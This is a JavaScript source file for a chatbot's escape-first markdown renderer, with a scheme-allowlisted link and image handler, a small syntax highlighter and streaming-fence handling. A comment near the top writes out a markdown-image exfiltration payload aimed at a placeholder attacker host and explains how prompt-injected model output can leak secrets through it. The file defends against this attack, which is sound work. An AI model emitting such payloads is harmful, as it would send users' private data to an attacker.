// superbot /chat markdown — escape-first renderer, no dependencies.
//
// Grammar deliberately small: headings, bold/italic, inline code, lists,
// blockquotes, hr, simple pipe tables, [text](url) links (scheme-allowlisted),
// and ``` fences with a language label + copy bar. Everything is HTML-escaped
// BEFORE any formatting (OWASP output-encoding), so model output can never
// inject markup, and fence bodies are escaped raw and never re-parsed.
//
// Renders arbitrary prefixes safely: an unterminated ``` fence shows its label
// bar with a cursor instead of leaking the half-fence as prose. That is what
// lets the typewriter reveal in chat.js call this on every animation frame —
// the fence only "opens" once its closer has arrived.
const esc = (s) => s.replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
const SAFE_HREF = /^(https?:\/\/|mailto:)/i;
// img src allowlist: same-origin generated files (/gen/, what the image-gen
// adapters return) plus base64 raster/svg data URIs. SVG in an <img> cannot run
// script. Arbitrary web URLs are deliberately NOT allowed: a model answer
// carrying `![x](https://attacker/?d=secret)` used to make every viewer's
// browser fetch it on render — the markdown-image exfiltration channel
// (OWASP LLM01:2025 prompt injection; embracethered.com, Google AI Studio
// 2024). A refused src falls through to the link rule and renders as a
// CLICKABLE link — no auto-fetch, but a click is a navigation — so anchors
// carry referrerpolicy="no-referrer" and the payload stays one explicit
// reader action, never an ambient one.
const SAFE_SRC = /^(\/gen\/|data:image\/(?:png|jpe?g|webp|gif|svg\+xml);base64,)/i;

const inline = (s) =>
  s
    .replace(/`([^`]+)`/g, '<code>$1</code>')
    .replace(/\*\*([^*]+)\*\*/g, '<b>$1</b>')
    .replace(/\*([^*\n]+)\*/g, '<i>$1</i>')
    // images before links: ![alt](src) contains the link shape, so the link
    // rule would otherwise eat it and leave a stray "!anchor".
    .replace(/!\[([^\]]*)\]\(([^)\s]+)\)/g, (m, alt, src) =>
      SAFE_SRC.test(src) ? `<img src="${src}" alt="${alt}" loading="lazy" referrerpolicy="no-referrer"/>` : m,
    )
    .replace(/\[([^\]]+)\]\(([^)\s]+)\)/g, (m, t, href) =>
      SAFE_HREF.test(href) ? `<a href="${href}" target="_blank" rel="noopener noreferrer" referrerpolicy="no-referrer">${t}</a>` : m,
    );

// --- syntax highlighting: heuristic micro-lexer (microlight's premise —
// one lexer for any language — plus a small lang-aware comment marker).
// It lexes the RAW code left to right and escapes PER TOKEN, so an HTML
// entity can never be split mid-span; classes are a fixed allowlist
// (tk-c comment / tk-s string / tk-n number / tk-k keyword). Runs every
// animation frame on a growing prefix, so an unterminated string or block
// comment simply colors to the end of what has arrived.
const KW = new Set(
  ('abstract and as async await begin bool break case catch chan class const continue def defer do elif else end enum ' +
   'except export extends false final finally fn for from func function go if impl implements import in int interface ' +
   'is lambda let local loop match mod module new nil none not null of or override package priv private pub public ' +
   'raise range return select self static struct switch then this throw true try type undefined use var void while with yield').split(' '),
);
const lineComment = (lang) =>
  /^(py|python|sh|bash|zsh|shell|yaml|yml|toml|rb|ruby|fish|dockerfile|makefile|r|conf|ini)$/i.test(lang) ? '#'
  : /^(sql|lua|hs|haskell|elm)$/i.test(lang) ? '--'
  : '//';
function hlight(lang, code) {
  const lc = lineComment(lang);
  const n = code.length;
  let out = '';
  let i = 0;
  const push = (cls, text) => { out += cls ? `<span class="tk-${cls}">${esc(text)}</span>` : esc(text); };
  const interesting = (j) =>
    /[A-Za-z_$0-9"'`]/.test(code[j]) || code.startsWith(lc, j) || (lc === '//' && code.startsWith('/*', j));
  while (i < n) {
    const c = code[i];
    if (code.startsWith(lc, i)) {
      let j = code.indexOf('\n', i);
      if (j === -1) j = n;
      push('c', code.slice(i, j));
      i = j;
      continue;
    }
    if (lc === '//' && code.startsWith('/*', i)) {
      let j = code.indexOf('*/', i + 2);
      j = j === -1 ? n : j + 2;
      push('c', code.slice(i, j));
      i = j;
      continue;
    }
    if (c === '"' || c === "'" || c === '`') {
      let j = i + 1;
      while (j < n) {
        if (code[j] === '\\') { j += 2; continue; }
        if (code[j] === c || (c !== '`' && code[j] === '\n')) break;
        j++;
      }
      if (j < n && code[j] === c) j++;
      push('s', code.slice(i, j));
      i = j;
      continue;
    }
    if (/[0-9]/.test(c)) {
      let j = i + 1;
      while (j < n && /[\w.]/.test(code[j])) j++;
      push('n', code.slice(i, j));
      i = j;
      continue;
    }
    if (/[A-Za-z_$]/.test(c)) {
      let j = i + 1;
      while (j < n && /[\w$]/.test(code[j])) j++;
      const w = code.slice(i, j);
      push(KW.has(w) ? 'k' : '', w);
      i = j;
      continue;
    }
    let j = i + 1;
    while (j < n && !interesting(j)) j++;
    push('', code.slice(i, j));
    i = j;
  }
  return out;
}

const codeShell = (lang, code, open) =>
  `<div class="code"><div class="lbl"><span>${esc(lang)}</span>` +
  (open
    ? '<span class="crsr">▊</span>'
    : '<button class="cpy" data-act="copy-code">copy</button>') +
  `</div><pre><code>${hlight(lang, code)}</code></pre></div>`;

const cells = (l) => l.replace(/^\s*\|/, '').replace(/\|\s*$/, '').split('|').map((c) => c.trim());
const isSep = (l) => /^\s*\|?[\s:-]*-[\s:|-]*\|[\s:|-]*$/.test(l) && l.includes('|');

// One text block (no fences): line-oriented pass over ESCAPED lines.
function blocks(text) {
  const lines = esc(text).split('\n');
  const out = [];
  let p = [];
  const flushP = () => {
    if (p.length) {
      out.push(`<p>${p.map(inline).join('<br/>')}</p>`);
      p = [];
    }
  };
  for (let i = 0; i < lines.length; i++) {
    const l = lines[i];
    if (!l.trim()) {
      flushP();
      continue;
    }
    let m;
    if ((m = /^(#{1,3})\s+(.*)$/.exec(l))) {
      flushP();
      out.push(`<div class="h h${m[1].length}">${inline(m[2])}</div>`);
      continue;
    }
    if (/^\s*(-{3,}|\*{3,})\s*$/.test(l)) {
      flushP();
      out.push('<hr/>');
      continue;
    }
    if (/^\s*>/.test(l)) {
      flushP();
      const q = [];
      while (i < lines.length && /^\s*>/.test(lines[i])) {
        q.push(lines[i].replace(/^\s*>\s?/, ''));
        i++;
      }
      i--;
      out.push(`<blockquote>${inline(q.join('<br/>'))}</blockquote>`);
      continue;
    }
    if (/^\s*[-*]\s+/.test(l) || /^\s*\d+[.)]\s+/.test(l)) {
      flushP();
      const ordered = /^\s*\d+[.)]\s+/.test(l);
      const re = ordered ? /^\s*\d+[.)]\s+/ : /^\s*[-*]\s+/;
      const items = [];
      while (i < lines.length && re.test(lines[i])) {
        items.push(lines[i].replace(re, ''));
        i++;
      }
      i--;
      out.push(`<${ordered ? 'ol' : 'ul'}>${items.map((t) => `<li>${inline(t)}</li>`).join('')}</${ordered ? 'ol' : 'ul'}>`);
      continue;
    }
    if (l.includes('|') && i + 1 < lines.length && isSep(lines[i + 1])) {
      flushP();
      const head = cells(l);
      i += 2;
      const rows = [];
      while (i < lines.length && lines[i].includes('|') && lines[i].trim()) {
        rows.push(cells(lines[i]));
        i++;
      }
      i--;
      out.push(
        '<table>' +
          `<tr>${head.map((c) => `<th>${inline(c)}</th>`).join('')}</tr>` +
          rows.map((r) => `<tr>${r.map((c) => `<td>${inline(c)}</td>`).join('')}</tr>`).join('') +
          '</table>',
      );
      continue;
    }
    p.push(l);
  }
  flushP();
  return out.join('');
}

export function renderMd(src) {
  // Line-based fence pairing, not a blind split on '```' (which mangled the
  // 4-backtick quoting convention and turned inline ```code``` prose into a
  // fence — same rules as the CLI renderer): an opener is a line-start
  // backtick run whose info string carries no backtick; its closer is a bare
  // run at least as long, so a fenced block quoting a fenced document stays
  // one block. A fence still open at the end of the (possibly mid-stream)
  // text renders with the cursor in the label bar.
  const lines = String(src ?? '').split('\n');
  let html = '';
  let plain = [];
  let fence = null; // { token, lang, body }
  const flushPlain = () => {
    if (plain.length) { html += blocks(plain.join('\n')); plain = []; }
  };
  for (const l of lines) {
    const m = /^\s*(`{3,})(.*)$/.exec(l);
    if (m && !fence && !m[2].includes('`')) {
      flushPlain();
      fence = { token: m[1], lang: m[2].trim() || 'code', body: [] };
      continue;
    }
    if (m && fence && m[2].trim() === '' && m[1].length >= fence.token.length) {
      html += codeShell(fence.lang, fence.body.join('\n'), false);
      fence = null;
      continue;
    }
    (fence ? fence.body : plain).push(l);
  }
  if (fence) html += codeShell(fence.lang, fence.body.join('\n'), true); // still streaming
  flushPlain();
  return html;
}
